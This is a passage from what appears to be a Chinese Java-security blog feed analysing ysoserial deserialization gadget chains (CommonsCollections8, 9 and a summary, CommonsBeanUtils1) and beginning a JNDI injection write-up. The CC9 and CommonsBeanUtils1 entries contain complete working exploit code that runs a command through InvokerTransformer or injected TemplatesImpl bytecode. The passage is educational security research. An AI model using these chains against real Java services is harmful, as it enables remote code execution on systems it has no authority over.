class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transformingComparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">        </span><br><span class="line">        TreeBag treeBag = <span class="keyword">new</span> TreeBag(transformingComparator);</span><br><span class="line">        treeBag.add(templates);</span><br><span class="line"></span><br><span class="line">        Field field2 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(treeBag);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如图所示:</p>
<p><img src="5.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.anquanke.com/post/id/190472#h3-4" target="_blank" rel="noopener">Java反序列化利用链分析之CommonsCollections2,4,8</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/116/files" target="_blank" rel="noopener">CommonsCollections8</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections9</title>
    <url>/2020/04/28/ysoserial-analyze-9/</url>
    <content><![CDATA[<p>这篇文章要分析的是CommonsCollections9，根据<a href="https://github.com/wh1t3p1g" target="_blank" rel="noopener">wh1t3p1g</a>师傅的收集，找到了<a href="https://github.com/meizjm3i" target="_blank" rel="noopener">梅子酒</a>师傅提交的CommonsCollections9。它利用了3.2.1版本中的<font color=#00800><code>DefaultedMap</code></font></p>
<a id="more"></a>

<p>前面已经分析了:<br><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/24/ysoserial-analyze-2/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections2</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-4/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections4</a><br><a href="https://ananaskr.github.io/2020/04/26/ysoserial-analyze-5/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections5</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-6/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections6</a><br><a href="https://ananaskr.github.io/2020/04/27/ysoserial-analyze-7/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections7</a><br><a href="https://ananaskr.github.io/2020/04/28/ysoserial-analyze-8/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections8</a> </p>
<p>梅子酒师傅提交的CommonsCollections9利用的是commonscollections:3.2版本新增加的<code>DefaultedMap</code>类来替代LazyMap。因为这两个类中的get函数具有类似的作用。作者表明只能在JDK8u76成功，实际上，在jdk1.8.0_111也能成功？</p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>commonscollections:3.2.1</li>
<li>未配置security-manager</li>
</ul>
<p>先来看看整个的利用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">  -&gt;TiedMapEntry.toString()</span><br><span class="line">    -&gt;DefaultedMap.get()</span><br><span class="line">      -&gt;ChainedTransformer.transform()</span><br><span class="line">        -&gt;ConstantTransformer.transform()</span><br><span class="line">        -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<h2 id="利用链分析及payload构造"><a href="#利用链分析及payload构造" class="headerlink" title="利用链分析及payload构造"></a>利用链分析及payload构造</h2><p>从payload的整个利用链可以看出，整个链的构造和CommonsCollections5很相似，都是利用了BadAttributeValueExpException作为最外层。不同的只有中间的<code>DefaultedMap</code>类，那么就从分析这个类开始。定位到这个类的get函数</p>
<p><img src="1.png" alt=""></p>
<p>在函数里会调用<code>((Transformer)this.value).transform(key)</code>，当this.value为构造的ChainedTransformer对象时，就可以RCE了。而这个value在DefaultedMap实例化时传入的参数。如下代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br></pre></td></tr></table></figure>

<p>然后其余的与CommonsCollections5一致，完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.DefaultedMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map defaultedMap = DefaultedMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(defaultedMap,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field field = val.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(val,tiedMapEntry);</span><br><span class="line">        </span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(val);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行的结果如下所示:</p>
<p><img src="2.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
<li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">CommonsCollections9payload</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial之CommonsCollections系列总结</title>
    <url>/2020/04/29/ysoserial-cc-sumary/</url>
    <content><![CDATA[<p>花了一周的时间对现有的CommonsCollections利用链分析了一遍，这篇文章是总结一下各利用链的特点、适用场景以及我自己对于Java反序列化链的一点思考。</p>
<a id="more"></a>

<h1 id="各利用链利用点"><a href="#各利用链利用点" class="headerlink" title="各利用链利用点"></a>各利用链利用点</h1><p>从前面的分析中，对于每个利用链，我们可以从外层触发点、中间承接点、命令执行点来分析。<br><font color=#00F5FF></font></p>
<p><strong>外层触发点:</strong></p>
<ul>
<li><strong><font color=#008000>AnnotationInvocationHandler</font></strong><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
</ul>
</li>
<li><strong><font color=#008000>BadAttributeValueExpException</font></strong><ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
</li>
<li><strong><font color=#008000>HashSet</font></strong><ul>
<li>HashMap.hash <ul>
<li>CommonsCollections6</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#008000>Hashtable</font></strong><ul>
<li>CommonsCollections7</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li><strong><font color=#008000>PriorityQueue</font></strong><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
</ul>
</li>
<li><strong><font color=#008000>TreeBag</font></strong><ul>
<li>CommonsCollections8</li>
</ul>
</li>
</ul>
<p><strong>中间承接点</strong></p>
<ul>
<li><strong><font color=#00C5CD>Proxy.invoke</font></strong><ul>
<li>CommonsCollections1</li>
</ul>
</li>
<li><strong><font color=#00C5CD>AbstractMap.equals</font></strong><ul>
<li>CommonsCollections7</li>
</ul>
</li>
<li><strong><font color=#00C5CD>TreeMap</font></strong><ul>
<li>CommonsCollections8    </li>
</ul>
</li>
<li><strong><font color=#00C5CD>TransformingCompare</font></strong><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
</ul>
</li>
<li><strong><font color=#00C5CD>TiedMapEntry.getValue</font></strong><ul>
<li>hashCode <ul>
<li>CommonsCollections6</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li>toString <ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#00C5CD>LazyMap.get</font></strong><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections6</li>
<li>CommonsCollections5</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li><strong><font color=#00C5CD>DefaultedMap.get</font></strong><ul>
<li>CommonsCollections9</li>
</ul>
</li>
</ul>
<blockquote>
<p>这里可以看到LazyMap.get和DefaultedMap.get是可作为中间承接点的第二层，即找到一个调用它的类作为中间承接点。</p>
</blockquote>
<p><strong>命令执行点</strong></p>
<ul>
<li><strong><font color=#CD5555>InvokerTransformer</font></strong>提供了通过反射创建实例对象<ul>
<li>constant+invoker+invoker<ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
<li>CommonsCollections7</li>
<li>CommonsCollections9</li>
<li>CommonsCollections10</li>
</ul>
</li>
<li>Invoker反射调用<code>newTransformer</code>方法<ul>
<li>CommonsCollections8</li>
<li>CommonsCollections2</li>
</ul>
</li>
</ul>
</li>
<li><strong><font color=#CD5555>InstantiateTransformer</font></strong>提供了实例化当前传入的类的方法<ul>
<li>TrAXFilter类的构造方法中含有<code>templates.newTransformer()</code><ul>
<li>CommonsCollections4</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="根据commons-collections版本"><a href="#根据commons-collections版本" class="headerlink" title="根据commons-collections版本"></a>根据commons-collections版本</h1><h2 id="commonscollections3-1"><a href="#commonscollections3-1" class="headerlink" title="commonscollections3.1"></a>commonscollections3.1</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
<li>CommonsCollections7</li>
<li>CommonsCollections10</li>
</ul>
<h2 id="commonscollections3-2-1"><a href="#commonscollections3-2-1" class="headerlink" title="commonscollections3.2.1"></a>commonscollections3.2.1</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
<li>CommonsCollections5</li>
<li>CommonsCollections6</li>
<li>CommonsCollections7</li>
<li>CommonsCollections9</li>
<li>CommonsCollections10</li>
</ul>
<h2 id="commonscollections4-0"><a href="#commonscollections4-0" class="headerlink" title="commonscollections4.0"></a>commonscollections4.0</h2><ul>
<li>CommonsCollections2</li>
<li>CommonsCollections4</li>
<li>CommonsCollections8</li>
</ul>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="未配置security-manager"><a href="#未配置security-manager" class="headerlink" title="未配置security-manager"></a>未配置security-manager</h2><ul>
<li>CommonsCollections5</li>
<li>CommonsCollections9</li>
</ul>
<h2 id="lt-JDK8u72"><a href="#lt-JDK8u72" class="headerlink" title="&lt;= JDK8u72"></a>&lt;= JDK8u72</h2><ul>
<li>CommonsCollections1</li>
<li>CommonsCollections3</li>
</ul>
<blockquote>
<p>在实际使用中，在3.x版本下使用6，7，10来进行测试会更好，没有太多的限制；在4.0版本下使用4，8来进行测试。</p>
</blockquote>
<h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>其实分析完上述的payload之后，很容易发现，在很多链中，都是由其他链分断合并而来。在找这样的利用链时，可以从执行最终的命令触发开始，往前寻找能够触发这一条件的方法，以及调用这些方法类，然后进行筛选，这样一层一层往外找，直到找到一个最外层。</p>
<p>对于外层触发点，一般需要具有以下条件:</p>
<ul>
<li>可被序列化</li>
<li>重写了readObject类</li>
<li>readObject类中有其他函数(除类似<code>defaultReadObject</code>之类的)调用</li>
</ul>
<p>对于中间承接点，一般需要具有以下条件:</p>
<ul>
<li>可被序列化</li>
<li>该类的类属性有函数调用</li>
<li>实现了InvocationHandler，具有invoke函数(考虑动态代理的方式)</li>
</ul>
<p>对于命令执行点，一般需要具有以下条件:</p>
<ul>
<li>能够加载并实例化类</li>
<li>或者能够反射调用创建对象并调用方法</li>
</ul>
<p>这是我的一个直观的想法，可能已经有工具使用来自动化地分析与寻找这些点。例如<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">Gadget Inspector</a>。</p>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoseial之CommonsBeanUtils1分析</title>
    <url>/2020/05/09/ysoserial-commonsbeanutils1/</url>
    <content><![CDATA[<p>最近在复现shiro 721的时候，发现可以利用CommonsBeanUtils1这条利用链。虽然这条利用链中也用到了commonscollections中的类，但整个的思路有很大的不同，故将其进行一波分析。</p>
<a id="more"></a>

<p>这条链利用到了<font color=#008000>commons-beanutils</font>和<font color=#008000>commons-collections</font>。它与CommonsCollections2、4都是以PriorityQueue作为入口点的，调用到comparator.compare函数。不过这里用的不是commons-collections的4.0版本，TransformingComparator并不能被反序列化，不可用。</p>
<p>因此，采用的是<font color=#008000><code>BeanComparator</code></font>类。接下来就来分析BeanComparator类的compare函数引发的一系列故事。</p>
<p>整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">  -&gt;PriorityQueue.heapify()</span><br><span class="line">    -&gt;PriorityQueue.siftDown()</span><br><span class="line">      -&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">        -&gt;BeanComparator.compare()</span><br><span class="line">          -&gt;PropertyUtils.getProperty()</span><br><span class="line">            -&gt;PropertyUtilsBean.getProperty()</span><br><span class="line">              -&gt;PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                -&gt;PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                  -&gt;PropertyUtilsBean.invokeMethod()</span><br><span class="line">                    -&gt;method.invoke()</span><br><span class="line">                      -&gt;TemplatesImpl.getOutputProperties()</span><br><span class="line">                        -&gt;TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在commons-beanutils的最新版:1.9.4中也可以利用。</p>
</blockquote>
<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>首先定位于BeanComparator.compare()函数。如下图所示:</p>
<p><img src="1.png" alt=""></p>
<p>然后跟进PropertyUtils.getProperty()函数。</p>
<p><img src="2.png" alt=""></p>
<p>继续跟进PropertyUtilsBean.getInstance().getProperty()函数。</p>
<p><img src="3.png" alt=""></p>
<p>然后跟进getNestedProperty()函数，如下图所示：</p>
<p><img src="4.png" alt=""></p>
<p>在此函数总它会根据传入的bean的类型进行不同的调用，由于我们传入的bean实际上是一个TemplatesImpl对象，因此会调用到getSimpleProperty()。跟进它。</p>
<p><img src="5.png" alt=""></p>
<p>同样的，在这里对bean进行一系列的判断以后，首先会根据property的值获取到propertyDescriptor，然后通过getReadMethod获取读取property的方法。最后会进入到invokeMethod函数，跟进这个函数。</p>
<p><img src="6.png" alt=""></p>
<p>在这个函数中，我们看到了一个很熟悉、很关键的函数<font color=#008000>method.invoke</font>。它用来执行对象的某个方法。对象就是此函数参数重的bean，values就是参数。在这条利用链中传入的是bean是TemplatesImpl对象，那么调用什么方法能够最终导致命令执行呢？定位到TemplatesImpl对象的<font color=#008000><code>getOutProperties()</code></font>方法。</p>
<p><img src="7.png" alt=""></p>
<p>在这个方法中会看到我们无比熟悉的<font color=#008000><code>newTransformer()</code></font>方法。</p>
<p>到这里整个利用链的分析就结束了。</p>
<h1 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h1><p>很显然的，整个过程当中需要使得bean为构造好的TemplatesImpl对象，然后property为outputProperties。定位到BeanComparator.compare函数。bean也就是o1为传入的参数，property为BeanComparator的类成员属性。因此，实例化BeanComparator类如下所示:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"outputProperties"</span>);</span><br></pre></td></tr></table></figure>

<p>然后追踪参数o1的来源，定位到PriorityQueue.siftDownUsingComparator函数中的comparator.compare函数中的参数c，c来源于queue对象。因此，queue中存入TemplatesImpl对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>, comparator);</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">Object[] queuearray = <span class="keyword">new</span> Object[]&#123;templates,templates&#125;;</span><br><span class="line"></span><br><span class="line">Field q1 = queue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">q1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">q1.set(queue,queuearray);</span><br></pre></td></tr></table></figure>

<h2 id="完整的demo"><a href="#完整的demo" class="headerlink" title="完整的demo"></a>完整的demo</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">"lowestSetBit"</span>);</span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,comparator);</span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line">        queue.add(<span class="keyword">new</span> BigInteger(<span class="string">"1"</span>));</span><br><span class="line"></span><br><span class="line">        Object[] queuearray = <span class="keyword">new</span> Object[]&#123;templates,templates&#125;;</span><br><span class="line"></span><br><span class="line">        Field q1 = queue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        q1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        q1.set(queue,queuearray);</span><br><span class="line"></span><br><span class="line">        Field c1 = comparator.getClass().getDeclaredField(<span class="string">"property"</span>);</span><br><span class="line">        c1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        c1.set(comparator,<span class="string">"outputProperties"</span>);</span><br><span class="line">        </span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下:</p>
<p><img src="8.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/" target="_blank" rel="noopener">Java 反序列化之 CommonsBeanUtils 分析</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsBeanUtils</tag>
      </tags>
  </entry>
  <entry>
    <title>JNDI注入分析复现总结</title>
    <url>/2020/06/06/jndi-injection/</url>
    <content><![CDATA[<p>前面的文章总结了RMI的安全性问题，而JNDI注入这类问题比RMI安全问题更常见。这篇文章分析了JNDI注入的整个流程，以及如何绕过高版本的2种方式。所有的代码放在了<a href="https://github.com/ananaskr/rmi/tree/master/src/main/java/jndi" target="_blank" rel="noopener">github</a>上。</p>
<a id="more"></a>

<h1 id="JNDI注入介绍"><a href="#JNDI注入介绍" class="headerlink" title="JNDI注入介绍"></a>JNDI注入介绍</h1><p>JNDI注入是BlackHat 2016的一个议题<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">“A Journey From JNDI LDAP Manipulation To RCE”</a>。</p>
<p>JNDI注入包括以下几种方法:</p>
<ul>
<li>JNDI配合RMI远程对象(codebase)</li>
<li>JNDI Reference配合RMI</li>
<li>JNDI Reference配合LDAP</li>
</ul>
<p>此攻击的整个步骤包括以下几步:</p>
<ol>
<li>服务端实例化JNDI initialContext</li>
<li>initialContext初始化期间调用lookup(rmi://attacker/Obj)请求攻击者的恶意RMIServer/LDAPServer</li>
<li>恶意RMIServer/LDAPServer返回JNDI Reference</li>
